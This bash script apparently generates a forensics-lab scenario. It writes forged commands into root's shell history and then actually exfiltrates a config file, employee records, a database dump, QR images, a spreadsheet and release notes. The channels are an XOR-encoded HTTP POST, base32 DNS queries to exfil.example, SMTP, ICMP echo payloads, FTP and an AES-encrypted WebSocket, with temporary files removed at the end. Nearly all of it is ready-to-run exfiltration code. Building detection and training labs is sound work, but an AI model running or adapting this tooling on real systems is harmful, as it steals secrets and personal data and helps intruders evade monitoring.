#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$ROOT/config.env"

# ---- helper functions ----

xor_file() {
  python3 - "$1" "$2" "$3" <<'PY'
import sys
a,b,k=sys.argv[1],sys.argv[2],sys.argv[3].encode()
d=open(a,'rb').read()
open(b,'wb').write(bytes(x^k[i%len(k)] for i,x in enumerate(d)))
PY
}

benign(){ "$ROOT/victim/benign_activity.sh" || true; sleep 1; }
hist(){ cat >>/root/.bash_history; }

# ======================================================================
# 0. Initial benign activity
# ======================================================================

hist <<'EOF'
cd /var/www
pwd
ls -lah
systemctl status nginx --no-pager
df -h
free -m
uptime
who
ps aux --sort=-%cpu | head -20
ss -lntup
cat /etc/hostname
cat /etc/os-release
cd /tmp
umask 077
ls -lah
date -u
EOF
benign

# ======================================================================
# 1. HTTP exfiltration — production.env
#    XOR with mango-47 -> Base64 -> HTTP POST
#    Key recovered via: printf 'bWFuZ28tNDc=' | base64 -d
# ======================================================================

hist <<'EOF'
ls -lah /opt/app/config
stat /opt/app/config/production.env
cat /opt/app/config/production.env > /tmp/.u1
wc -c /tmp/.u1
sha256sum /tmp/.u1
printf 'bWFuZ28tNDc=' | base64 -d > /tmp/.k1
EOF
xor_file /opt/app/config/production.env /tmp/.u1.xor "$HTTP_KEY"
base64 -w0 /tmp/.u1.xor >/tmp/.u1.b64
curl -sS -X POST "http://$HTTP_IP/api/update" --data-binary @/tmp/.u1.b64 >/dev/null 2>&1 || true
rm -f /tmp/.u1.xor /tmp/.u1.b64
benign

# ======================================================================
# 2. DNS exfiltration — employee_records.csv
#    Base32 -> 30-char chunks -> DNS queries to explicit DNS server
# ======================================================================

hist <<'EOF'
ls -lah /opt/hr
stat /opt/hr/employee_records.csv
head -5 /opt/hr/employee_records.csv
cat /opt/hr/employee_records.csv > /tmp/.u2
wc -l /tmp/.u2
base32 -w0 /tmp/.u2 > /tmp/.b32
fold -w 30 /tmp/.b32 | head
for x in $(cat /tmp/.b32 | fold -w 30); do dig +short ${x}.exfil.example @203.0.113.53; done
dig +short metrics.internal.example
dig +short logging.internal.example
cat /etc/resolv.conf
EOF
base32 -w0 /opt/hr/employee_records.csv >/tmp/.b32
while read -r x; do
  dig +short "$x.$DNS_DOMAIN" @"$DNS_IP" >/dev/null 2>&1 || true
  sleep .15
done < <(fold -w 30 /tmp/.b32)
rm -f /tmp/.b32
benign

# ======================================================================
# 3. SMTP exfiltration — QR code PNGs via email
#    Three emails with real QR PNG MIME attachments
# ======================================================================

hist <<'EOF'
printf '%s\n' 'Monthly reconciliation completed.' > /tmp/note
mailq
python3 /opt/smtp_sender.py --smtp-host 203.0.113.25
mailq
EOF
python3 "$ROOT/attacker/smtp_sender.py" --smtp-host "$SMTP_IP" --recipient "$SMTP_RECIPIENT" || true
benign

# ======================================================================
# 4. ICMP exfiltration — db.dump
#    XOR with raven-19 -> hex -> chunks -> ICMP Echo Requests
#    Key recovered via: printf 'cmF2ZW4tMTk=' | base64 -d
# ======================================================================

hist <<'EOF'
printf 'cmF2ZW4tMTk=' | base64 -d > /tmp/.k4
cat /var/backups/db.dump > /tmp/.u4
wc -c /tmp/.u4
xxd -p /tmp/.u4 | tr -d '\n' > /tmp/.hex
wc -c /tmp/.hex
head -c 64 /tmp/.hex
ping -c 1 192.0.2.91
EOF
# XOR the source file with the key, then hex-encode
xor_file /var/backups/db.dump /tmp/.u4.xor "$ICMP_KEY"
xxd -p /tmp/.u4.xor | tr -d '\n' > /tmp/.hex
# Send via Scapy-based ICMP sender
python3 "$ROOT/attacker/icmp_sender.py" --hex-file /tmp/.hex --dest "$ICMP_IP" --chunk-size 56 || true
rm -f /tmp/.u4.xor
benign

# ======================================================================
# 5. FTP exfiltration — q3_forecast.xlsx
#    gzip -> Base64 -> FTP upload
# ======================================================================

hist <<'EOF'
ls -lah /opt/finance
stat /opt/finance/q3_forecast.xlsx
gzip -c /opt/finance/q3_forecast.xlsx > /tmp/.gz
ls -lh /tmp/.gz
base64 -w0 /tmp/.gz > /tmp/.u5
wc -c /tmp/.u5
ftp -inv 203.0.113.88
EOF
gzip -c /opt/finance/q3_forecast.xlsx >/tmp/.gz
base64 -w0 /tmp/.gz >/tmp/.u5
if command -v ftp >/dev/null; then
ftp -inv "$FTP_IP" <<EOF || true
user $FTP_USER $FTP_PASSWORD
binary
put /tmp/.u5 daily_metrics.dat
bye
EOF
fi
benign

# ======================================================================
# 6. WebSocket exfiltration — release-notes.txt
#    AES-256-CBC + PBKDF2 + salt -> Base64 -> WebSocket
#    Password recovered via: printf 'U3Rvcm0tV2luZC0yMDI2' | base64 -d
# ======================================================================

hist <<'EOF'
cat /srv/app/releases/release-notes.txt > /tmp/.u6
wc -c /tmp/.u6
printf 'U3Rvcm0tV2luZC0yMDI2' | base64 -d > /tmp/.k6
openssl enc -aes-256-cbc -pbkdf2 -salt -pass file:/tmp/.k6 -in /tmp/.u6 -out /tmp/.u6.enc
ls -lh /tmp/.u6.enc
base64 -w0 /tmp/.u6.enc
EOF
printf '%s' "$WS_PASSWORD" > /tmp/.k6
openssl enc -aes-256-cbc -pbkdf2 -salt -pass file:/tmp/.k6 -in /srv/app/releases/release-notes.txt -out /tmp/.u6.enc
python3 "$ROOT/attacker/websocket_client.py" --url "ws://$WS_IP:8080/exfil" --file /tmp/.u6.enc || true

# ======================================================================
# Cleanup
# ======================================================================

rm -f /tmp/.u1 /tmp/.u2 /tmp/.u4 /tmp/.u5 /tmp/.u6 /tmp/.k1 /tmp/.k4 /tmp/.k6 /tmp/.hex /tmp/.gz /tmp/.b32 /tmp/.u6.enc /tmp/note /tmp/.u1.xor /tmp/.u4.xor

hist <<'EOF'
find /tmp -maxdepth 1 -type f -printf '%p\n'
history | tail -20
journalctl --since "15 minutes ago" --no-pager | tail -50
ss -antp
ps aux --sort=-%mem | head -15
df -h
free -m
uptime
logout
EOF
echo "[+] simulation complete"
